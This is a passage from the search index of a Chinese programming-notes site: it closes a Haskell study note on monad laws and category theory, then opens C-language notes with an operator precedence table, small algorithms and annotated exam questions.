\u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u53ef\u4ee5\u4e3a\u5b83\u5b9a\u4e49 \\(\\mathrm{unit}\\) \u548c \\(\\mathrm{join}\\) \u4e24\u4e2a\u6001\u5c04\u3002Haskell \u4e2d\u7684\u5217\u8868\u4e5f\u53ef\u4ee5\u8fd1\u4f3c\u770b\u4f5c\u5e42\u96c6\u51fd\u5b50\u3002</p> \u6001\u5c04/\u51fd\u6570\u7684\u7c7b\u578b \u5e42\u96c6\u51fd\u5b50 Haskell \u4e2d\u5217\u8868 \u4e00\u4e2a\u96c6\u5408 \\(S\\) \u548c\u4e00\u4e2a\u6001\u5c04 \\(f : A\\to B\\) \u4e00\u4e2a\u7c7b\u578b T \u548c\u4e00\u4e2a\u51fd\u6570 f :: A -&gt; B \\(P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)\\) fmap f :: [A] -&gt; [B] \\(\\mathrm{unit}_S : S\\to\\mathcal{P}(S)\\) return :: T -&gt; [T] \\(\\mathrm{join}_S : \\mathcal{P}(\\mathcal{P}(S))\\to\\mathcal{P}(S)\\) join :: [[T]] -&gt; [T] \u6001\u5c04/\u51fd\u6570\u7684\u5b9a\u4e49 \u5e42\u96c6\u51fd\u5b50 Haskell \u4e2d\u5217\u8868 \\((\\mathcal{P}(f))(S) = \\\\{f(a):a\\in S\\\\}\\) fmap f xs = [ f a | a &lt;- xs ] \\(\\mathrm{unit}_S(x) = \\\\{x\\\\}\\) return x = [x] \\(\\mathrm{join}_S(L) = \\bigcup L\\) join xs = concat xs"},{"location":"cs/pl/haskell/#_29","title":"\u5355\u5b50\u516c\u7406","text":"<p>\u7ed9\u5b9a\u4e00\u4e2a\u5355\u5b50 \\(M : \\mathbf{C}\\to\\mathbf{C}\\)\uff0c\u548c\u4e00\u4e2a\u6001\u5c04 \\(f : A\\to B\\)\uff08\u5176\u4e2d \\(A,B\\in \\mathbf{C}\\)\uff09\uff0c\u90a3\u4e48\u6ee1\u8db3\u4e0b\u9762\u56db\u6761\u5b9a\u5f8b\uff1a</p> <ol> <li>\\(\\mathrm{join}\\circ M(\\mathrm{join})=\\mathrm{join}\\circ\\mathrm{join}\\)</li> <li>\\(\\mathrm{join}\\circ M(\\mathrm{unit})=\\mathrm{join}\\circ\\mathrm{unit}=\\mathrm{id}\\)</li> <li>\\(\\mathrm{unit}\\circ f = M(f)\\circ\\mathrm{unit}\\)</li> <li>\\(\\mathrm{join}\\circ M(M(f)) = M(f)\\circ\\mathrm{join}\\)</li> </ol> <p>\u4e5f\u53ef\u4ee5\u5f88\u81ea\u7136\u5730\u5c06\u5176\u8f6c\u5316\u4e3a Haskell \u4e2d\u7684\u8868\u8ff0\uff1a</p> <ol> <li>join . fmap join = join . join </li> <li>join . fmap return = join . return = id </li> <li>return . f = fmap f . return </li> <li>join . fmap (fmap f) = fmap f . join</li> </ol> <p>\u5728 Haskell \u4e2d\uff0c\u4f7f\u7528 <code>&gt;&gt;=</code> \u4e5f\u6709\u4e09\u4e2a\u5b9a\u5f8b\u548c\u8fd9\u56db\u4e2a\u5b9a\u5f8b\u662f\u7b49\u4ef7\u7684\uff1a</p> <ol> <li>return x &gt;&gt;= f = f x    <pre><code>  return x &gt;&gt;= f \n= join (fmap f (return x)) = join (fmap f . return $ x)\n= join (return (f x)) = join (return . f $ x)\n= join . return $ (f x)\n= id (f x)\n= f x\n</code></pre></li> <li>m &gt;&gt;= return = m   <pre><code>  m &gt;&gt;= return \n= join (fmap return m) = join . fmap return $ m \n= id m\n= m \n</code></pre></li> <li>(m &gt;&gt;= f) &gt;&gt;= g = m &gt;&gt;= (\\x -&gt; f x &gt;&gt;= g)   <pre><code>  (m &gt;&gt;= f) &gt;&gt;= g \n= (join (fmap f m)) &gt;&gt;= g = join (fmap g (join (fmap f m)))\n= join . fmap g . join $ fmap f m \n= join . join . fmap (fmap g) $ fmap f m \n= join . join . fmap (fmap g) . fmap f $ m \n= join . join . fmap (fmap g . f) $ m \n= join . fmap join . fmap (fmap g . f) $ m \n= join . fmap (join . (fmap g . f)) $ m \n= join . fmap (\\x -&gt; join (fmap g (f x))) $ m \n= join . fmap (\\x -&gt; f x &gt;&gt;= g) $ m \n= join (fmap (\\x -&gt; f x &gt;&gt;= g) m)\n= m &gt;&gt;= (\\x -&gt; f x &gt;&gt;= g)\n</code></pre></li> </ol> <p>\u6709\u5173 do \u8bed\u53e5\u548c <code>&gt;=&gt;</code> \u7684\u516c\u7406\u8868\u8ff0\u5728\u4e0a\u6587\u4e2d\u5df2\u7ecf\u8bf4\u8fc7</p>"},{"location":"cs/pl/haskell/#_30","title":"\u540e\u8bb0","text":"<p>\u5543\u4e86\u5c06\u8fd1\u4e00\u4e2a\u6708\uff0c\u7b97\u662f\u628a Haskell \u7684\u4e3b\u8981\u5185\u5bb9\u90fd\u5543\u5b8c\u4e86\u3002\u4e3b\u8981\u5c31\u662f\u524d\u671f\u770b Learn You a Haskell\uff0c\u540e\u671f\u770b Typeclassopedia\uff0c\u90fd\u662f pdcxs \u63a8\u8350\u7ed9\u7684\u6559\u7a0b\u3002\u4f46\u662f\u4e00\u5806\u89c6\u9891\u4e00\u4e2a\u90fd\u6ca1\u6709\u8010\u5fc3\u770b\u8fdb\u53bbqwq</p> <p>\u540e\u9762\u7684\u90e8\u5206\u7684\u7406\u89e3\u611f\u89c9\u4e5f\u6ca1\u5230\u4f4d\uff0cCategory\u3001Arrow \u7b49\u8fd9\u4e9b\u7c7b\u578b\u7c7b\u4e5f\u5c31\u662f\u5927\u81f4\u5730\u770b\u4e86\u4e00\u773c\uff0c\u751a\u81f3\u6709\u4ec0\u4e48\u7528\u90fd\u4e0d\u592a\u6e05\u695a_(:\u0437\u300d\u2220)_</p> <p>\u611f\u89c9 Haskell \u8fd9\u95e8\u8bed\u8a00\u786e\u5b9e\u5f88\u795e\u5947\uff0c\u5f88\u591a\u8bed\u6cd5\u90fd\u5f88\u6709\u610f\u601d\uff0c\u800c\u4e14\u53ef\u4ee5\u505a\u5230\u975e\u5e38\u8d34\u8fd1\u6570\u5b66\u3001\u8d34\u8fd1\u6570\u5b66\u6982\u5ff5\u3002\u5b66\u7684\u65f6\u5019\u4e5f\u662f\u8d8a\u5b66\u5751\u8d8a\u591a\uff0c\u5148\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u5f15\u7533\u5230\u4e86 lambda \u6f14\u7b97\uff0c\u7136\u540e\u662f\u51fd\u5b50\u7b49\u4e00\u7cfb\u5217\u6982\u5ff5\u5f15\u7533\u5230\u4e86\u8303\u7574\u8bba\uff0c\u76ee\u524d\u8303\u7574\u8bba\u7b80\u5355\u5730\u770b\u4e86\u4e00\u90e8\u5206\uff0clambda \u6f14\u7b97\u4e5f\u6ca1\u6df1\u5165\u7814\u7a76\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u8bf4\u4e86\uff08\u5495\u5495\u5495\uff09</p> <p>\u73b0\u5728\u611f\u89c9\u6211\u5b66\u5230\u7684 Haskell \u7b80\u76f4\u662f\u76ae\u6bdb\uff0c\u8fd8\u6709\u4e00\u5806\u6e90\u7801\u91cc\u7684\u4e1c\u897f\u4e0d\u77e5\u9053\u662f\u600e\u4e48\u56de\u4e8b\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e#\uff0c~\uff09\uff0c\u4e5f\u8fd8\u6709\u4e00\u5806\u7c7b\u578b\u7c7b\u548c\u7528\u6cd5\u6ca1\u6709\u5b66\u5230\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e Monad Transformer\u3001Writer\u3001Reader\u3001State\u3001Comonad\u3001MonadFix\u3001Lens\u3001Parsec\u3001\u2026\u2026\uff09md\uff0c\u8fd9\u4e48\u4e00\u770b\u5dee\u7684\u8fd8\u771f\u591a\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u6162\u6162\u5b66\u4e86\uff0c\u8fd9\u4e2a\u5047\u671f\u8fd8\u6709\u597d\u591a\u5176\u5b83\u4e8b\u8981\u5e72\u5462\uff0cHaskell \u8fd9\u8fb9\u5148\u6478\u4e86_(:\u0437\u300d\u2220)_</p>"},{"location":"cs/pl/haskell/#reference","title":"Reference","text":"<ul> <li>Learn You a Haskell</li> <li>Writing foldl using foldr - StackOverflow</li> <li>Haskell\uff1a\u7528foldr\u5b9a\u4e49foldl</li> <li>Typeclassopedia - Haskell wiki</li> <li>Hoogle</li> <li>Functors, Applicatives, And Monads In Pictures</li> <li>Haskell\u5b66\u4e60 - functor</li> <li>Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff088\uff09Monoid - zwvista</li> <li>Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0816\uff09Alternative - zwvista</li> <li>Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0840\uff09Arrow\uff081\uff09 - zwvista</li> <li>24 Days of GHC Extensions: Arrows - Tom Ellis</li> <li>Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0847\uff09Arrow\uff082\uff09 - zwvista</li> <li>Haskell/Category theory - wikibooks</li> <li>Category theory - wikipedia</li> <li>\u8303\u7574\u8bba - \u7ef4\u57fa\u767e\u79d1</li> <li>Monad (category theory) - wikipedia</li> <li>Functor - wikipedia</li> </ul> <p> \"The End?\" </p>"},{"location":"cs/pl/c_cpp/c/","title":"C \u8bed\u8a00\u6742\u9879","text":"<p> \u7ea6 6351 \u4e2a\u5b57  121 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 23 \u5206\u949f</p> <p>Abstract</p> <p>\u8bb0\u5f55\u4e00\u4e9b\u7b2c\u4e00\u6b21\u89c1\u8fc7\u7684\u7528\u6cd5\u3001\u6709\u7528\u7684\u6587\u7ae0/\u5de5\u5177\uff0c\u4ee5\u53ca\u5bb9\u6613\u5fd8\u7684\u77e5\u8bc6\u70b9\u3002\u540e\u9762\u662f\u6574\u7406\u7684\u4e00\u4e9b\u6613\u9519\u9898\u3002</p> <ul> <li>\u6d59\u6c5f\u5927\u5b66 \u201c\u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840\u201d\uff08\u5927\u4e00\u79cb\u51ac\uff09\u8bfe\u7a0b\u590d\u4e60\u7b14\u8bb0</li> <li>\u6d59\u6c5f\u5927\u5b66 \u201d\u7a0b\u5e8f\u8bbe\u8ba1\u57fa\u7840\u201c \u201dC \u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\u201c\uff08\u5927\u4e00\u79cb\u51ac\uff09\u8f85\u5b66\u6613\u9519\u9898\u96c6</li> </ul> <p>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840</p>"},{"location":"cs/pl/c_cpp/c/#_1","title":"\u7a0b\u5e8f\u8bbe\u8ba1\u4e0e\u7b97\u6cd5\u57fa\u7840","text":""},{"location":"cs/pl/c_cpp/c/#_2","title":"\u8003\u8bd5\u6613\u9519\u9898","text":"<ul> <li>zjj \u5927\u4f6c\u6574\u7406\u7684\u7a0b\u7b97\u6613\u9519\u9898</li> </ul>"},{"location":"cs/pl/c_cpp/c/#_3","title":"\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7","text":"\u4f18\u5148\u7ea7 \u8fd0\u7b97\u7b26 \u7ed3\u5408\u5f8b 1 \u540e\u7f00\u8fd0\u7b97\u7b26\uff1a[]  ()  \u00b7  -&gt; \u4ece\u5de6\u5230\u53f3 2 \u4e00\u5143\u8fd0\u7b97\u7b26\uff1a++  --  !  ~  +\uff08\u6b63\uff09  -\uff08\u8d1f\uff09  *  &amp;  sizeof \u7c7b\u578b\u8f6c\u6362 \u4ece\u53f3\u5230\u5de6 3 \u4e58\u9664\u6cd5\u8fd0\u7b97\u7b26\uff1a*  /  % \u4ece\u5de6\u5230\u53f3 4 \u52a0\u51cf\u6cd5\u8fd0\u7b97\u7b26\uff1a+  - \u4ece\u5de6\u5230\u53f3 5 \u79fb\u4f4d\u8fd0\u7b97\u7b26\uff1a&lt;&lt;  &gt;&gt; \u4ece\u5de6\u5230\u53f3 6 \u5173\u7cfb\u8fd0\u7b97\u7b26\uff1a&lt;  &lt;=  &gt;  &gt;= \u4ece\u5de6\u5230\u53f3 7 \u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a==  != \u4ece\u5de6\u5230\u53f3 8 \u4f4d\u8fd0\u7b97\u7b26 AND\uff1a&amp; \u4ece\u5de6\u5230\u53f3 9 \u4f4d\u8fd0\u7b97\u7b26 XOR\uff1a^ \u4ece\u5de6\u5230\u53f3 10 \u4f4d\u8fd0\u7b97\u7b26 OR\uff1a| \u4ece\u5de6\u5230\u53f3 11 \u903b\u8f91\u8fd0\u7b97\u7b26 AND\uff1a&amp;&amp; \u4ece\u5de6\u5230\u53f3 12 \u903b\u8f91\u8fd0\u7b97\u7b26 OR\uff1a|| \u4ece\u5de6\u5230\u53f3 13 \u6761\u4ef6\u8fd0\u7b97\u7b26\uff1a?: \u4ece\u53f3\u5230\u5de6 14 \u8d4b\u503c\u8fd0\u7b97\u7b26\uff1a=  +=  -=  *=  /=  %=  &amp;=  ^=  |=  &lt;&lt;=  &gt;&gt;= \u4ece\u53f3\u5230\u5de6 15 \u9017\u53f7\u8fd0\u7b97\u7b26\uff1a\uff0c \u4ece\u5de6\u5230\u53f3"},{"location":"cs/pl/c_cpp/c/#_4","title":"\u6613\u5fd8\u7b97\u6cd5","text":"gcd<pre><code>int gcd(int a, int b) {\n    return b == 0 ? a : gcd(b, a % b);\n}\n</code></pre> exgcd<pre><code>void exgcd(int a, int b, int* d, int* x, int* y) {\n    if (!b) { *d = a; *x = 1; *y = 0; }\n    else { exgcd(b, a % b, d, y, x); *y -= *x * (a / b); }\n}\n</code></pre> \u5feb\u901f\u5e42<pre><code>int pow_mod(int a, int p, int n){\n    long long res = 1;\n    while (p) {\n        if (p &amp; 1) res = 1LL * res * a % n;\n        a = 1LL * a * a % n;\n        p &gt;&gt;= 1;\n    }\n    return (int)res;\n}\n</code></pre>"},{"location":"cs/pl/c_cpp/c/#_5","title":"\u8f93\u51fa\u7c7b\u578b","text":"<p>\u522b\u7684\u8bed\u8a00\uff08\u6bd4\u5982 Python\u3001Haskell\uff09\u5f88\u591a\u90fd\u53ef\u4ee5\u901a\u8fc7\u5185\u7f6e\u7684\u65b9\u6cd5\u8f7b\u677e\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f46\u662f C/C++ \u7684\u8bdd\u4ece\u6765\u6ca1\u4e86\u89e3\u8fc7\uff08C \u5230\u76ee\u524d\u4e5f\u6ca1\u4e86\u89e3\u8fc7\u5185\u7f6e\u7684\u6709\u8fd9\u79cd\u529f\u80fd\u7684\u5e93\uff09</p> <p>\u67e5\u5230\u4e86 C++ \u53ef\u4ee5\u4f7f\u7528 typeid(...).name() \u7684\u65b9\u6cd5\uff08\u5728\u5934\u6587\u4ef6 &lt;typeinfo&gt; \u4e2d\uff09\u5f97\u5230\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u4f46\u662f\u7ed3\u679c\u6bd4\u8f83\u62bd\u8c61</p> <p>C++ \u8fd8\u53ef\u4ee5\u4f7f\u7528\u5934\u6587\u4ef6 &lt;cxxabi.h&gt; \u8fd9\u4e2a\u5e93\u91cc\u63d0\u4f9b\u7684 abi::__cxa_demangle \u51fd\u6570\u6765\u5f97\u5230\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\uff1a <pre><code>#include &lt;stdio.h&gt;\n#include &lt;cxxabi.h&gt;\n#include &lt;typeinfo&gt;\n\nint main() {\n  int *(*p)[10];\n  char* str = abi::__cxa_demangle(typeid(p).name(), NULL, NULL, NULL);\n  printf(\"%s\\n\", str); // \u5f97\u5230 int* (*) [10]\n  return 0;\n}\n</code></pre></p> <p>\u53c8\u641c\u7d22\u5230\u4e86 https://cdecl.org/ \u8fd9\u4e2a\u7f51\u7ad9\u3002\u5f3a\u7684\u5f88\uff0c\u76f4\u63a5\u8f93\u5165\u7c7b\u578b\u58f0\u660e\u5c31\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230\u82f1\u6587\u63cf\u8ff0\uff0c\u4e5f\u53ef\u4ee5\u7ed9\u82f1\u6587\u63cf\u8ff0\u8f6c\u6362\u6210\u7c7b\u578b\u58f0\u660e</p> <p>\u6e90\u7801\uff1a ridiculousfish/cdecl-blocks</p>"},{"location":"cs/pl/c_cpp/c/#_6","title":"\u7a0b\u5e8f\u8bbe\u8ba1\u8f85\u5b66\u5e38\u95ee\u9898\u76ee\u96c6\u53ca\u89e3\u6790","text":"<p>\u8fd9\u91cc\u662f\u4f5c\u4e3a 2022 \u5e74\u7afa\u9662\u56e2\u59d4\u5b66\u7814\u90e8\u7a0b\u5e8f\u8bbe\u8ba1\u8f85\u5b66\u7b54\u7591\u5b66\u957f\u65f6\u6574\u5408\u7684\u7fa4\u91cc\u7ecf\u5e38\u95ee\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u5305\u62ec\u89e3\u6790\uff0c\u4e5f\u6709\u4e00\u4e9b\u76f8\u5173\u77e5\u8bc6\u70b9\u7684\u6574\u7406\u3002\u5927\u90e8\u5206\u9898\u76ee\u662f 13-18 \u7684\u671f\u672b\u771f\u9898\uff0c\u5c0f\u90e8\u5206\u4e2d\u6587\u9898\u76ee\u662f\u7fa4\u91cc\u6211\u4e0d\u6e05\u695a\u6765\u6e90\u7684 PTA \u4e0a\u7684\u9898\u76ee\u6216\u8005\u6211\u81ea\u5df1\u7f16\u7684\u5c0f\u9898\u3002\u4e00\u5171\u4e94\u5341\u9053\u9898\uff0c\u5df2\u7ecf\u6309\u7167\u8003\u70b9/\u6613\u9519\u70b9\u5206\u5f00\u4e86\u3002</p>"},{"location":"cs/pl/c_cpp/c/#_7","title":"\u6807\u8bc6\u7b26/\u5173\u952e\u5b57","text":"<p>\u8fd9\u7c7b\u9898\u76ee\u4e00\u822c\u662f\u95ee\u54ea\u4e9b\u662f\u5408\u6cd5\u7684\u6807\u8bc6\u7b26\u3001\u54ea\u4e9b\u662f\u5173\u952e\u5b57\u3002\u5bf9\u4e8e\u6807\u8bc6\u7b26\uff0c\u53ea\u9700\u8981\u8003\u8651 <code>int &lt;identifier&gt;;</code> \u662f\u5426\u5408\u6cd5\uff0c\u5982\u679c\u5408\u6cd5\uff0c\u90a3 <code>&lt;identifier&gt;</code> \u5c31\u662f\u5408\u6cd5\u7684\u6807\u8bc6\u7b26\uff08\u6216\u8005\u8003\u8651\u662f\u4e0d\u662f\u5173\u952e\u5b57\uff0c\u5982\u679c\u662f\u5173\u952e\u5b57\uff0c\u90a3\u80af\u5b9a\u4e0d\u662f\u5408\u6cd5\u7684\u6807\u8bc6\u7b26\uff09\u3002\u81f3\u4e8e\u5173\u952e\u5b57\uff0c\u53ef\u4ee5\u770b cppreference\u3002 </p> <ol> <li> <p>(C13A) Which one below is NOT a keyword of the C programming language? _____      A. define B. if C. typedef D. while </p> <p>Success</p> <p><code>define</code> \u4e0d\u662f\u5173\u952e\u5b57\uff0c\u662f\u9884\u5904\u7406\u6307\u4ee4\uff0c\u4f60\u751a\u81f3\u53ef\u4ee5 <code>int define;</code> \u800c <code>if</code>\u3001<code>typedef</code>\u3001<code>while</code> \u663e\u7136\u90fd\u662f\u5173\u952e\u5b57\u3002</p> </li> <li> <p>(C14A) Which one below is NOT a valid identifier in the C programming language? _____      A. printf B. _ever C. \"char\" D. true </p> <p>Success</p> <p>\u663e\u7136\u9009\u62e9 C\uff0c\u56e0\u4e3a <code>int \"char\";</code> \u80af\u5b9a\u662f\u975e\u6cd5\u7684\uff0c\u6807\u8bc6\u7b26\u5fc5\u987b\u4ee5\u5b57\u6bcd\u6216\u4e0b\u5212\u7ebf\u5f00\u5934\u3002\u5bf9\u4e8e A\uff0cprintf \u53ea\u662f\u4e00\u4e2a\u51fd\u6570\u540d\uff0c\u4e0d\u662f\u5173\u952e\u5b57\uff0c\u6240\u4ee5\u662f\u5408\u6cd5\u7684\u3002\u5bf9\u4e8e D\uff0cC \u8bed\u8a00\u4e2d true \u5e76\u4e0d\u662f\u5173\u952e\u5b57\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u3002</p> </li> </ol>"},{"location":"cs/pl/c_cpp/c/#_8","title":"\"\u52a0\u62ec\u53f7\"\u95ee\u9898","text":"<p>\u5373\u6307\u8868\u8fbe\u5f0f\u4e2d\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7\u7b49\u95ee\u9898\uff0c\u4f8b\u5982\u7ed9\u4e00\u4e2a\u590d\u6742\u7684\u6ca1\u6709\u62ec\u53f7\u7684\u8868\u8fbe\u5f0f\uff0c\u8fd9\u65f6\u4e25\u683c\u6309\u7167\u4f18\u5148\u7ea7\u89c4\u5219\u7ed9\u8868\u8fbe\u5f0f\u5404\u4e2a\u90e8\u5206\u52a0\u4e0a\u62ec\u53f7\uff0c\u7ed3\u679c\u5c31\u6e05\u6670\u4e86\u3002</p> <p>\u5173\u4e8e\u4f18\u5148\u7ea7\u7684\u9898\u76ee\u8fd9\u91cc\u5c31\u4e0d\u5217\u4e86\uff0c\u53ef\u4ee5\u53bb\u67e5\u9605\u4fee\u4f6c\u7684 note\uff0c\u91cc\u9762\u5199\u7684\u5f88\u6e05\u6670\u4e86\u3002</p> <p>\u8fd9\u91cc\u7ed9\u51fa\u4e24\u9053\u548c\u4e09\u76ee\u8fd0\u7b97\u7b26 ?: \u6709\u5173\u7684\u9898\u76ee\u3002</p> <ol> <li> <p>(C18A) Given: <code>int a=1,b=2,c=3,d=4;</code>, the value of the expression <code>a&lt;b?a:c&lt;d?c:d</code> is _____.</p> <p>Success</p> <p>\u5bf9\u4e8e\u4e09\u76ee\u8fd0\u7b97\u7b26\uff0c\u4f60\u9700\u8981\u77e5\u9053\u4e00\u4e2a ? \u80af\u5b9a\u8981\u548c\u540e\u9762\u7684\u4e00\u4e2a : \u8fdb\u884c\u914d\u5bf9 \u90a3\u4e48 <code>c&lt;d?c:d</code> \u8fd9\u90e8\u5206\u4e00\u5b9a\u662f\u4e00\u4f53\u7684\uff0c\u53ef\u4ee5\u7ed9\u5b83\u5de6\u53f3\u52a0\u4e0a\u62ec\u53f7\uff0c\u5c31\u53d8\u6210\u4e86 <code>a&lt;b?a:(c&lt;d?c:d)</code>\uff0c\u5c31\u5df2\u7ecf\u5f88\u6e05\u6670\u4e86\u3002 \u6240\u4ee5\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\uff1aa&lt;b \u6210\u7acb\uff0c\u9009\u62e9\u7b2c\u4e00\u4e2a\u7ed3\u679c\u4e5f\u5c31\u662f a\uff0c\u7b54\u6848\u662f 1</p> </li> <li> <p>\u82e5\u5b9a\u4e49 <code>int a=1,b=2,c=3,d=4</code> \u90a3\u4e48\u8868\u8fbe\u5f0f <code>(a&gt;b?c&gt;a?c-3:c-1:b==c?d-a:d-c)</code> \u7684\u503c\u4e3a _____.</p> <p>Success</p> <p>\u548c\u4e0a\u9762\u540c\u7406\uff0c\u4e0d\u8fc7\u6709\u4e9b\u590d\u6742\u3002\u4f46\u662f\u8fd9\u4e2a\u4e09\u76ee\u8fd0\u7b97\u7b26\u7684\u914d\u5bf9\u8fc7\u7a0b\u6211\u4eec\u53ef\u4ee5\u7c7b\u6bd4\u4e3a\u62ec\u53f7\u5339\u914d\u3002\u5c06 ? \u89c6\u4e3a\u5de6\u62ec\u53f7 (\uff0c: \u89c6\u4e3a\u53f3\u62ec\u53f7 )\uff0c\u90a3\u4e48\u4e00\u4e2a ? \u5e94\u8be5\u548c\u54ea\u4e2a : \u914d\u5bf9\u5c31\u6e05\u6670\u4e86\u3002 <pre><code>(a&gt;b?c&gt;a?c-3:c-1:b==c?d-a:d-c)\n    (   (   )   )    (   )\n    |   +---+   |    +---+\n    +-----------+\n</code></pre> \u77e5\u9053\u4e86 ? \u548c : \u914d\u5bf9\u5173\u7cfb\u4e4b\u540e\u5c31\u80fd\u6b63\u786e\u5212\u5206\u7ed3\u6784\u4e86\uff1a <pre><code>a&gt;b? (c&gt;a?c-3:c-1) : (b==c?d-a:d-c)\n</code></pre> \u6240\u4ee5 a&gt;b \u4e0d\u6210\u7acb\uff0c\u9009\u62e9\u540e\u8005\uff0cb==c \u4e0d\u6210\u7acb\uff0c\u518d\u9009\u62e9\u540e\u8005\uff0c\u7b54\u6848\u662f d-c=1</p> </li> </ol>"},{"location":"cs/pl/c_cpp/c/#_9","title":"\u6570\u636e\u7c7b\u578b\u53ca\u5b57\u9762\u91cf","text":"<p>\u51e0\u4e2a\u5e38\u89c1\u7684\u6570\u636e\u7c7b\u578b\u4e00\u5b9a\u8981\u77e5\u9053\u5b83\u4eec\u5360\u51e0\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\u3002\u5e76\u4e14\u5728\u8868\u8fbe\u5f0f\u4e2d\u4e5f\u8981\u65f6\u523b\u6ce8\u610f\u5e38\u91cf\u7684\u7c7b\u578b\uff08\u5982\u7b2c\u4e5d\u9898\uff09\u3002</p> <p>\u5b57\u9762\u91cf\u5373\u4e00\u4e2a\u503c\u7684\u8868\u793a\u65b9\u6cd5\uff1a</p> <ul> <li>\u6574\u578b\uff1a123 \u8868\u793a\u5341\u8fdb\u5236 123\uff1b0123 \u662f\u516b\u8fdb\u5236\u7684\u8868\u793a\u65b9\u6cd5\uff08\u5f00\u5934\u4e00\u5b9a\u52a0 0\uff0c0123 \u7b49\u4ef7\u4e8e 83\uff09\uff0c0x123 \u662f\u5341\u516d\u8fdb\u5236\u7684\u8868\u793a\u65b9\u6cd5\uff08\u5f00\u5934\u4e00\u5b9a\u52a0 0x\uff0c0x123 \u7b49\u4ef7\u4e8e 291\uff09</li> <li>\u5b57\u7b26\u578b\uff1a<ul> <li>\u8bb0\u4f4f\u4e00\u4e2a\u5b57\u7b26\u7c7b\u578b\u5b9e\u9645\u4e0a\u5c31\u76f8\u5f53\u4e8e\u4e00\u4e2a\u5b57\u8282\u7684\u6574\u578b\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u6570\u503c\u6765\u8868\u793a\uff1achar c = 65; \u5c31\u76f8\u5f53\u4e8e char c = 'A';</li> <li>\u540c\u65f6  \u5728\u5f15\u53f7\u91cc\u6709\u8f6c\u4e49\u7684\u6548\u679c\uff0c\u6bd4\u5982 '\\n' '\\t' \u90fd\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\uff0c\u800c '\\\\' \u624d\u4f1a\u8868\u793a\u4e00\u4e2a  \u5b57\u7b26\uff1b</li> <li>\u518d\u8fdb\u4e00\u6b65\uff0c \u540e\u9762\u53ef\u4ee5\u63a5\u6700\u591a\u4e09\u4e2a\u6570\u5b57\u6765\u4f7f\u7528\u516b\u8fdb\u5236\u8868\u793a\u4e00\u4e2a\u5b57\u8282\uff0c\u4e14\u9047\u5230 0-7 \u8303\u56f4\u4e4b\u5916\u7684\u6570\u5b57\u4f1a\u7ed3\u675f\u5f53\u524d\u5b57\u8282\uff0c\u6bd4\u5982 '\\101' \u4e5f\u8868\u793a 'A'\uff0c\u800c '\\08' \u56e0\u4e3a 8 \u8d85\u8fc7\u4e86\u516b\u8fdb\u5236\u8303\u56f4\uff0c\u6240\u4ee5\u8fd9\u662f\u4e24\u4e2a\u5b57\u7b26\u653e\u5230\u4e86\u4e00\u4e2a\u5355\u5f15\u53f7\u91cc\uff0c\u4e0d\u662f\u6b63\u786e\u7684\u7528\u6cd5\uff0c\u5982\u679c\u5199\u6210\u5b57\u7b26\u4e32\uff0c\u5219 \"\\08\" \u8868\u793a\u4e24\u4e2a\u5b57\u7b26\uff1b</li> <li>\\x \u540e\u9762\u63a5 0-9A-F \u5b57\u7b26\u901a\u8fc7\u5341\u516d\u8fdb\u5236\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u3002\u4e0d\u8fc7\u5e76\u4e0d\u4f1a\u6709\u957f\u5ea6\u9650\u5236\uff0c\u6bd4\u5982 '\\x00000041' \u4e5f\u662f\u4e00\u4e2a\u5b57\u7b26\uff0c\u540c\u6837\u9047\u5230\u8303\u56f4\u5916\u7684\u5b57\u7b26\u5c31\u7ed3\u675f\u3002</li> </ul> </li> </ul> <ol> <li> <p>(C13A) For code below:     <pre><code>unsigned short sht = 0;\nsht--;\n</code></pre>     What will be the value of <code>sht</code> after the execution? _____      A. -1 B. 65535 C. 32767 D. 65536 </p> <p>Success</p> <p>sht \u662f unsigned short \u7c7b\u578b\uff0c\u662f\u4e24\u4e2a\u5b57\u8282\u7684\uff0c\u6240\u4ee5\u8303\u56f4\u4e3a 0-65535\u3002 \u65e0\u7b26\u53f7\u6574\u578b\u4ece 0 \u51cf\u53bb 1 \u4f1a\u4e0b\u6ea2\u5230\u6700\u5927\u503c\uff0c\u5bf9\u4e8e\u6b64\u9898\u4e5f\u5c31\u662f 65535\uff0c\u9009 B</p> </li> <li> <p>(C13A) Which literal below is 124 in decimal(\u5341\u8fdb\u5236)? _____      A. 0124 B. 124d C. 0x124 D. 0174 </p> <p>Success</p> <p>\u6839\u636e\u524d\u9762\u8bf4\u5230\u7684\uff0cA. 0124 \u662f\u516b\u8fdb\u5236\u8868\u793a\u6cd5\uff0c\u5b83\u7b49\u4e8e\u5341\u8fdb\u5236\u7684 84\uff1bB. 124d 